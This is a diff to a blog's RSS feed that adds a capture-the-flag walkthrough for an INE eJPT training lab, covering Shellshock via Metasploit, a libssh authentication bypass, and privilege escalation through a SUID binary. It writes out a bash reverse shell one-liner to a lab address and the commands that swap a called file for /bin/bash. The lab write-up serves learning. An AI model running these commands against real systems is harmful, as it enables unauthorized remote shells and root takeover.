@@ -6,8 +6,112 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 30 Mar 2025 23:00:53 +0000</lastBuildDate>
+        <lastBuildDate>Sun, 06 Apr 2025 17:15:27 +0100</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Walkthrough : Host &amp; Network Penetration Testing: System-Host Based Attacks CTF 2 (INE - eJPT)</title>
+            <link>/posts/ine_ctf_3/</link>
+            <pubDate>Sun, 06 Apr 2025 17:15:27 +0100</pubDate>
+            
+            <guid>/posts/ine_ctf_3/</guid>
+            <description>&lt;p&gt;Continuing on with my eJPT certification, this time we&amp;rsquo;ll tackle the second CTF in the  &lt;em&gt;System-Host Based Attacks&lt;/em&gt; course.&lt;/p&gt;
+&lt;p&gt;In this lab we&amp;rsquo;re provided with two machine; target-1 and target-2. And we have 4 flags to capture :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Flag 1&lt;/strong&gt;: Check the root (&amp;rsquo;/&amp;rsquo;) directory for a file that might hold the key to the first flag on target1.ine.local.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Flag 2&lt;/strong&gt;: In the server&amp;rsquo;s root directory, there might be something hidden. Explore &amp;lsquo;/opt/apache/htdocs/&amp;rsquo; carefully to find the next flag on target1.ine.local.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Flag 3&lt;/strong&gt;: Investigate the user&amp;rsquo;s home directory and consider using &amp;rsquo;libssh_auth_bypass&amp;rsquo; to uncover the flag on target2.ine.local.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Flag 4&lt;/strong&gt;: The most restricted areas often hold the most valuable secrets. Look into the &amp;lsquo;/root&amp;rsquo; directory to find the hidden flag on target2.ine.local.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These would mostly be linux machines (since we&amp;rsquo;re in the linux section of the course), so let&amp;rsquo;s start by tackling both the first and second flag at the same time.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>Continuing on with my eJPT certification, this time we&rsquo;ll tackle the second CTF in the  <em>System-Host Based Attacks</em> course.</p>
+<p>In this lab we&rsquo;re provided with two machine; target-1 and target-2. And we have 4 flags to capture :</p>
+<ul>
+<li><strong>Flag 1</strong>: Check the root (&rsquo;/&rsquo;) directory for a file that might hold the key to the first flag on target1.ine.local.</li>
+<li><strong>Flag 2</strong>: In the server&rsquo;s root directory, there might be something hidden. Explore &lsquo;/opt/apache/htdocs/&rsquo; carefully to find the next flag on target1.ine.local.</li>
+<li><strong>Flag 3</strong>: Investigate the user&rsquo;s home directory and consider using &rsquo;libssh_auth_bypass&rsquo; to uncover the flag on target2.ine.local.</li>
+<li><strong>Flag 4</strong>: The most restricted areas often hold the most valuable secrets. Look into the &lsquo;/root&rsquo; directory to find the hidden flag on target2.ine.local.</li>
+</ul>
+<p>These would mostly be linux machines (since we&rsquo;re in the linux section of the course), so let&rsquo;s start by tackling both the first and second flag at the same time.</p>
+<h2 id="flag-1--2">Flag 1 &amp; 2</h2>
+<p>Tradition dictates to start with a service detection nmap scan even if we already have the confirmation that we would be mostly targeting an apache server on the first machine.</p>
+
+    <img src="/CTF3/nmap-1.png"  alt="First nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Our assumption is confirmed; It seems to be an apache server running on a linux machine.</p>
+
+    <img src="/CTF3/web-1.png"  alt="Webpage"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Did you notice the address bar?</p>
+
+    <img src="/CTF3/web-2.png"  alt="Webpage address bar"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>We spot a .cgi script. Let&rsquo;s see if the <a href="https://yassine-elhammoumi.github.io/posts/shellshock/">Shellshock</a> attack could give us access to the target. For that we&rsquo;ll be using the metasploit module : <em>exploit/multi/http/apache_mod_cgi_bash_env_exec</em>.</p>
+
+    <img src="/CTF3/metasploit-1.png"  alt="metasploit-1"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+<p><em>note : You can checkout <a href="https://yassine-elhammoumi.github.io/posts/shellshock/">my post about the Shellshock vulnerability</a>, I judge it will get you more familiarity with it.</em></p>
+<hr>
+<h2 id="flag-3">Flag 3</h2>
+<p>Without losing any time, let&rsquo;s start on the second machine, with, of course, another service scan.</p>
+
+    <img src="/CTF3/nmap-2.png"  alt="second nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>We find a libssh instance running on the server and we&rsquo;re told to use the <em>&rsquo;libssh_auth_bypass&rsquo;</em> on metasploit to try and access the machine.</p>
+
+    <img src="/CTF3/metasploit-2.png"  alt="metasploit-2"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>I sat up the action to <strong>&lsquo;Execute&rsquo;</strong> and navigated to the user home directory; as told. And there we found the third flag.</p>
+<p>Notice that the <strong>welcome</strong> file has the <a href="https://en.wikipedia.org/wiki/Setuid">SUID permission</a> is set up.</p>
+<h2 id="flag-4">Flag 4</h2>
+<p>To capture the last flag, I decided to set up a netcat listener and have a reverse tcp session created through the <em>&rsquo;libssh_auth_bypass&rsquo;</em> :</p>
+<p><strong>bash -i&gt;&amp;/dev/tcp/172.16.116.1/1234  0&gt;&amp;1</strong>.</p>
+
+    <img src="/CTF3/nc-1.png"  alt="netcat one"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+
+    <img src="/CTF3/metasploit-3.png"  alt="metasploit-3"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+
+    <img src="/CTF3/nc-2.png"  alt="netcat two"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>We get a reverse shell on the machine with the user &lsquo;user&rsquo;.</p>
+<p>Remember the welcome file? let&rsquo;s see it we could exploit it to elevate our privileges.</p>
+<p><strong>strings welcome</strong>
+
+    <img src="/CTF3/shell-1.png"  alt="shell one"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+</p>
+<p>The welcome file mentions the greetings file, so if we could tamper with the greetings file to get us a privileged session we&rsquo;d get access to the /root directory.</p>
+<p><strong>rm greetings</strong></p>
+<p><strong>cp /bin/bash greetings</strong></p>
+<p><strong>./welcome</strong></p>
+
+    <img src="/CTF3/shell-2.png"  alt="shell two"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>And we got access to the root account, great! Let&rsquo;s capture the last flag.</p>
+
+    <img src="/CTF3/shell-3.png"  alt="shell three"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>And that&rsquo;s it, we&rsquo;ve captured all flags.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Well that was once again a very easy CTF but I enjoyed solving it.</p>
+]]></content>
+        </item>
         
         <item>
             <title>Walkthrough : Host &amp; Network Penetration Testing: System-Host Based Attacks CTF 1 (INE - eJPT)</title>
